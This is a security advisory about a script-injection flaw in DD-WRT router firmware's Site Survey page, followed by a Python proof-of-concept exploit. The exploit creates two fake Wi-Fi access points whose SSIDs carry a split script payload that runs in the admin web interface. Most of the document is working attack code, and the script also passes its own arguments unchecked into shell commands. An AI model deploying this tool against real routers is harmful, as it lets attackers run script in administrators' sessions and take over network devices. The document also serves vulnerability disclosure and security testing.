source: http://www.securityfocus.com/bid/30573/info

DD-WRT is prone to a script-injection vulnerability because it fails to adequately sanitize user-supplied data to the 'Site Survey' section of the administrative web interface.

Attackers can exploit this issue to execute arbitrary script code in the DD-WRT web interface.

Versions prior to DD-WRT 24-sp1 are vulnerable. 

#!/usr/bin/env python
# 
# This tool is distributed under a BSD licence. A copy of this 
# should have been included with this file.
#
# Copyright (c) 2008, Rafael Dominguez Vega.
#
# This tool is designed for the purpose of performing security 
# testing only and is not intended to be used for unlawful 
# activities.
#
# This tool can be used to check for SSID script injection 
vulnerabilities 
# in different sofware products.
# 
# Help can be viewed by running this file with --help. 
# 
#
# Author: Rafael Dominguez Vega
# Version: 0.0.2
#
# Further information: rafael ({dot}) dominguez-vega <(at)> 
mwrinfosecurity {(dot)} com
#

import optparse
import sys
import os
import time
from optparse import OptionParser

class OptionParser (optparse.OptionParser):

    def check_required (self, opt):
        option = self.get_option(opt)

        if getattr(self.values, option.dest) is None:
            self.error("%s option not supplied" % option)

parser = OptionParser()
parser.add_option("-i", "--interface1", action="store", 
dest="ap1",help="Network interface for first Access Point (required)")
parser.add_option("-j", "--interface2", action="store", dest="ap2", 
help="Network interface for second Access Point (required)")
parser.add_option("-s", "--ssid1", action="store", dest="ssid1",  
help="SSID for first Access Point.  Between double quotes (\"\") if 
special characters are used (required)")
parser.add_option("-t", "--ssid2", action="store", dest="ssid2", 
help="SSID for second Access Point.  Between double quotes (\"\") if 
special characters are used (required)")

(options, args) = parser.parse_args()

parser.check_required("-i")
if options.ap1:
    ap1 = options.ap1
else:
    sys.exit(0)
    
parser.check_required("-j")
if options.ap2:
    ap2 = options.ap2
else:
    sys.exit(0)
    
parser.check_required("-s")
if options.ssid1:
    ssid1 = options.ssid1
else:
    sys.exit(0)
    
parser.check_required("-t")
if options.ssid2:
    ssid2 = options.ssid2
else:
    sys.exit(0)



ssid1 = ssid1.replace("<", "\<")
ssid1 = ssid1.replace(">","\>")
ssid1 = ssid1.replace("(","\(")
ssid1 = ssid1.replace(")","\)")
ssid1 = ssid1.replace("$","\$")
ssid1 = ssid1.replace("&","\&")
ssid1 = ssid1.replace(";","\;")
ssid1 = ssid1.replace("|","\|")
ssid1 = ssid1.replace("*","\*")
ssid1 = ssid1.replace(" ","\ ")

ssid2 = ssid2.replace("<", "\<")
ssid2 = ssid2.replace(">","\>")
ssid2 = ssid2.replace("(","\(")
ssid2 = ssid2.replace(")","\)")
ssid2 = ssid2.replace("$","\$")
ssid2 = ssid2.replace("&","\&")
ssid2 = ssid2.replace(";","\;")
ssid2 = ssid2.replace("|","\|")
ssid2 = ssid2.replace("*","\*")
ssid2 = ssid2.replace(" ","\ ")


os.system("wlanconfig "+ap1+" destroy")
os.system("wlanconfig "+ap2+" destroy")
print("\n Initialising fake APs...\n")

os.system("wlanconfig "+ap1+" create wlandev wifi0 wlanmode ap bssid")
time.sleep(3)
os.system("iwconfig "+ap1+" essid "+ssid1)
time.sleep(2)
os.system("wlanconfig "+ap2+" create wlandev wifi0 wlanmode ap bssid")
time.sleep(3)
os.system("iwconfig "+ap2+" essid "+ssid2)

print("Payload: "+ssid1+ssid2)